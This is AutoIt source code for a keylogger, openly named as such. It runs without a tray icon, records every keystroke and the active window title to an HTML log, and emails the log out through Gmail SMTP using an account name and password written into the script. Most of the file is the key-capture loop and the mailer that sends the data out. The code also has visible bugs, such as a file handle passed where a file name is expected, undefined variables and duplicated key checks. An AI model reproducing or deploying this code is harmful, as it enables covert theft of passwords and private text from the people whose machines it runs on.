#Include <file.au3>
#NoTrayIcon
#region - SMTP Variables
$SmtpServer = "smtp.gmail.com"       
$FromName = "Keylogger"              
$FromAddress = "keylggr25@gmail.com" 
$ToAddress = "keylggr25@gmail.com"   
$Subject = "Userinfo"                   
$Body = ""                              
$count = 1
$date=@year&@mon&@mday
$AttachFiles = @ScriptDir&"\logfiles"&$date&"-"&$count&".htm"
$Importance = "Normal"               
$Username = "keylggr25"              
$Password = "ArnoldBotha"            
$IPPort=465                          
$ssl=1                               

Global $oMyRet[2]
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
Global $MegaByte = ('1048576')
#endregion

#region Keylogger

$UserDll = DllOpen("user32.dll")  
Func _IsPressed($hexKey)
Local $aR, $bO
$aR = DllCall($UserDll, "int", "GetAsyncKeyState", "int", $hexKey)
If $aR[0] <> 0 Then
    $bO = 1
Else
    $bO = 0
EndIf

Return $bO
EndFunc

$window2=""

$log= @ScriptDir

$file = FileOpen($AttachFiles, 1)
If $file = -1 Then
Exit
EndIf
filewrite($file,"<font face=Verdana size=1>")

Func _LogKeyPress($what2log)
	If _FileSizeMB($file) > 2 Then
		$rc = _INetSmtpMailCom($SmtpServer, $FromName, $FromAddress, $ToAddress, $Subject, $Body, $AttachFiles, $CcAddress, $BccAddress, $Importance, $Username, $Password, $IPPort, $ssl)
		FileClose($file)
		$Count += 1
		$AttachFiles = @ScriptDir&"\logfiles"&$date&"-"&$count&".htm"
		$file = FileOpen($AttachFiles)
	EndIf
	$window=wingettitle("")
	if $window=$window2 Then
	   FileWrite($file,$what2log)
	   Sleep(100)
	Else
		$window2=$window
		FileWrite($file, "<br><BR>" & "<b>["& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC & ']  Window: "'& $window& '"</b><br>'& $what2log)
		sleep (100)
	Endif
EndFunc


While 1
	If _IsPressed(0xBA) = 1 Then _LogKeyPress('; ')
	If _IsPressed(0xBB) = 1 Then _LogKeyPress('= ')
	If _IsPressed(0xBC) = 1 Then _LogKeyPress(', ')
	If _IsPressed(0xBD) = 1 Then _LogKeyPress('- ')
	If _IsPressed(0xBE) = 1 Then _LogKeyPress('. ')
	If _IsPressed(0xBF) = 1 Then _LogKeyPress('/ ')
	If _IsPressed(0xC0) = 1 Then _LogKeyPress('` ')
	If _IsPressed(0xDB) = 1 Then _LogKeyPress('[ ')
	If _IsPressed(0xDC) = 1 Then _LogKeyPress('\ ')
	If _IsPressed(0xDD) = 1 Then _LogKeyPress('] ')
	If _IsPressed(0xDE) = 1 Then _LogKeyPress("' ")
	If _IsPressed(0x08) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{BACKSPACE}</i></font> ')
	If _IsPressed(0x09) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{TAB}</i></font> ')
	If _IsPressed(0x0D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ENTER}</i></font> ')
	If _IsPressed(0x13) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAUSE}</i></font> ')
	If _IsPressed(0x14) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{CAPSLOCK}</i></font> ')
	If _IsPressed(0x1B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ESC}</i></font> ')
	If _IsPressed(0x20) = 1 Then _LogKeyPress(' ')
	If _IsPressed(0x21) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAGE UP}</i></font> ')
	If _IsPressed(0x22) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAGE DOWN}</i></font> ')
	If _IsPressed(0x23) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{END}</i></font> ')
	If _IsPressed(0x24) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{HOME}</i></font> ')
	If _IsPressed(0x25) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT ARROW}</i></font> ')
	If _IsPressed(0x26) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{UP ARROW}</i></font> ')
	If _IsPressed(0x27) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT ARROW}</i></font> ')
	If _IsPressed(0x28) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DOWN ARROW}</i></font> ')
	If _IsPressed(0x2C) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PRINT SCREEN}</i></font> ')
	If _IsPressed(0x2D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{INS}</i></font> ')
	If _IsPressed(0x2E) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DEL}</i></font> ')
	If _IsPressed(0x30) = 1 Then _LogKeyPress('0')
	If _IsPressed(0x31) = 1 Then _LogKeyPress('1')
	If _IsPressed(0x32) = 1 Then _LogKeyPress('2')
	If _IsPressed(0x33) = 1 Then _LogKeyPress('3')
	If _IsPressed(0x34) = 1 Then _LogKeyPress('4')
	If _IsPressed(0x35) = 1 Then _LogKeyPress('5')
	If _IsPressed(0x36) = 1 Then _LogKeyPress('6')
	If _IsPressed(0x37) = 1 Then _LogKeyPress('7')
	If _IsPressed(0x38) = 1 Then _LogKeyPress('8')
	If _IsPressed(0x39) = 1 Then _LogKeyPress('9')
	If _IsPressed(0x41) = 1 Then _LogKeyPress('a')
	If _IsPressed(0x42) = 1 Then _LogKeyPress('b')
	If _IsPressed(0x43) = 1 Then _LogKeyPress('c')
	If _IsPressed(0x44) = 1 Then _LogKeyPress('d')
	If _IsPressed(0x45) = 1 Then _LogKeyPress('e')
	If _IsPressed(0x46) = 1 Then _LogKeyPress('f')
	If _IsPressed(0x47) = 1 Then _LogKeyPress('g')
	If _IsPressed(0x48) = 1 Then _LogKeyPress('h')
	If _IsPressed(0x49) = 1 Then _LogKeyPress('i')
	If _IsPressed(0x4A) = 1 Then _LogKeyPress('j')
	If _IsPressed(0x4B) = 1 Then _LogKeyPress('k')
	If _IsPressed(0x4C) = 1 Then _LogKeyPress('l')
	If _IsPressed(0x4D) = 1 Then _LogKeyPress('m')
	If _IsPressed(0x4E) = 1 Then _LogKeyPress('n')
	If _IsPressed(0x4F) = 1 Then _LogKeyPress('o')
	If _IsPressed(0x50) = 1 Then _LogKeyPress('p')
	If _IsPressed(0x51) = 1 Then _LogKeyPress('q')
	If _IsPressed(0x52) = 1 Then _LogKeyPress('r')
	If _IsPressed(0x53) = 1 Then _LogKeyPress('s')
	If _IsPressed(0x54) = 1 Then _LogKeyPress('t')
	If _IsPressed(0x55) = 1 Then _LogKeyPress('u')
	If _IsPressed(0x56) = 1 Then _LogKeyPress('v')
	If _IsPressed(0x57) = 1 Then _LogKeyPress('w')
	If _IsPressed(0x58) = 1 Then _LogKeyPress('x')
	If _IsPressed(0x59) = 1 Then _LogKeyPress('y')
	If _IsPressed(0x5A) = 1 Then _LogKeyPress('z')
	If _IsPressed(0x5B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT WIN}</i></font> ')
	If _IsPressed(0x5C) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT WIN}</i></font> ')
	If _IsPressed(0x60) = 1 Then _LogKeyPress('Num 0')
	If _IsPressed(0x61) = 1 Then _LogKeyPress('Num 1')
	If _IsPressed(0x62) = 1 Then _LogKeyPress('Num 2')
	If _IsPressed(0x63) = 1 Then _LogKeyPress('Num 3')
	If _IsPressed(0x64) = 1 Then _LogKeyPress('Num 4')
	If _IsPressed(0x65) = 1 Then _LogKeyPress('Num 5')
	If _IsPressed(0x66) = 1 Then _LogKeyPress('Num 6')
	If _IsPressed(0x67) = 1 Then _LogKeyPress('Num 7')
	If _IsPressed(0x68) = 1 Then _LogKeyPress('Num 8')
	If _IsPressed(0x69) = 1 Then _LogKeyPress('Num 9')
	If _IsPressed(0x6A) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{MULTIPLY}</i></font> ')
	If _IsPressed(0x6B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ADD}</i></font> ')
	If _IsPressed(0x6C) = 1 Then _LogKeyPress('Separator')
	If _IsPressed(0x6D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{SUBTRACT}</i></font> ')
	If _IsPressed(0x6E) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DECIMAL}</i></font> ')
	If _IsPressed(0x6F) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DIVIDE}</i></font> ')
	If _IsPressed(0x70) = 1 Then _LogKeyPress('F1 ')
	If _IsPressed(0x71) = 1 Then _LogKeyPress('F2 ')
	If _IsPressed(0x72) = 1 Then _LogKeyPress('F3 ')
	If _IsPressed(0x73) = 1 Then _LogKeyPress('F4 ')
	If _IsPressed(0x74) = 1 Then _LogKeyPress('F5 ')
	If _IsPressed(0x75) = 1 Then _LogKeyPress('F6 ')
	If _IsPressed(0x76) = 1 Then _LogKeyPress('F7 ')
	If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
	If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
	If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
	If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
	If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
	If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
	If _IsPressed(0x7A) = 1 Then _LogKeyPress('F11 ')
	If _IsPressed(0x7B) = 1 Then _LogKeyPress('F12 ')
	If _IsPressed(0x7C) = 1 Then _LogKeyPress('F13 ')
	If _IsPressed(0x7D) = 1 Then _LogKeyPress('F14 ')
	If _IsPressed(0x7E) = 1 Then _LogKeyPress('F15 ')
	If _IsPressed(0x7F) = 1 Then _LogKeyPress('F16 ')
	If _IsPressed(0x80) = 1 Then _LogKeyPress('F17 ')
	If _IsPressed(0x81) = 1 Then _LogKeyPress('F18 ')
	If _IsPressed(0x82) = 1 Then _LogKeyPress('F19 ')
	If _IsPressed(0x83) = 1 Then _LogKeyPress('F20 ')
	If _IsPressed(0x84) = 1 Then _LogKeyPress('F21 ')
	If _IsPressed(0x85) = 1 Then _LogKeyPress('F22 ')
	If _IsPressed(0x86) = 1 Then _LogKeyPress('F23 ')
	If _IsPressed(0x87) = 1 Then _LogKeyPress('F24 ')
	If _IsPressed(0x90) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{NUM LOCK}</i></font> ')
	If _IsPressed(0x91) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{SCROLL LOCK}</i></font> ')
	If _IsPressed(0xA0) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT SHIFT}</i></font> ')
	If _IsPressed(0xA1) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT SHIFT}</i></font> ')
	If _IsPressed(0xA2) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT CTRL}</i></font> ')
	If _IsPressed(0xA3) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT CTRL}</i></font> ')
	If _IsPressed(0xA4) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT ALT}</i></font> ')
	If _IsPressed(0xA5) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT ALT}</i></font> ')
   sleep(100)
Wend
#endregion

#region SMTP Mailer
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance="Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
    Local $objEmail = ObjCreate("CDO.Message")
    $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
    $objEmail.To = $s_ToAddress
    Local $i_Error = 0
    Local $i_Error_desciption = ""
    If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
    If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
    $objEmail.Subject = $s_Subject
    If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
        $objEmail.HTMLBody = $as_Body
    Else
        $objEmail.Textbody = $as_Body & @CRLF
    EndIf
    If $s_AttachFiles <> "" Then
        Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
        For $x = 1 To $S_Files2Attach[0]
            $S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
;~          ConsoleWrite('@@ Debug : $S_Files2Attach[$x] = ' & $S_Files2Attach[$x] & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
            If FileExists($S_Files2Attach[$x]) Then
                ConsoleWrite('+> File attachment added: ' & $S_Files2Attach[$x] & @LF)
                $objEmail.AddAttachment($S_Files2Attach[$x])
            Else
                ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
                SetError(1)
                Return 0
            EndIf
        Next
    EndIf
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
    If Number($IPPort) = 0 then $IPPort = 25
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
    ;Authenticated SMTP
    If $s_Username <> "" Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
    EndIf
    If $ssl Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    EndIf
    ;Update settings
    $objEmail.Configuration.Fields.Update
    ; Set Email Importance
    Switch $s_Importance
        Case "High"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "High"
        Case "Normal"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Normal"
        Case "Low"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Low"
    EndSwitch
    $objEmail.Fields.Update
    ; Sent the Message
    $objEmail.Send
    If @error Then
        SetError(2)
        Return $oMyRet[1]
    EndIf
    $objEmail=""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
    $HexNumber = Hex($oMyError.number, 8)
    $oMyRet[0] = $HexNumber
    $oMyRet[1] = StringStripWS($oMyError.description, 3)
    ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
    SetError(1); something to check for when this function returns
    Return
EndFunc   ;==>MyErrFunc
#endregion



Func _FileSizeMB ($File)
	$FileSizeInBytes = FileGetSize ($File)
	$Equal = $FileSizeInBytes / $MegaByte
	$Round = Round ($Equal, '2')
	Return $Round
EndFunc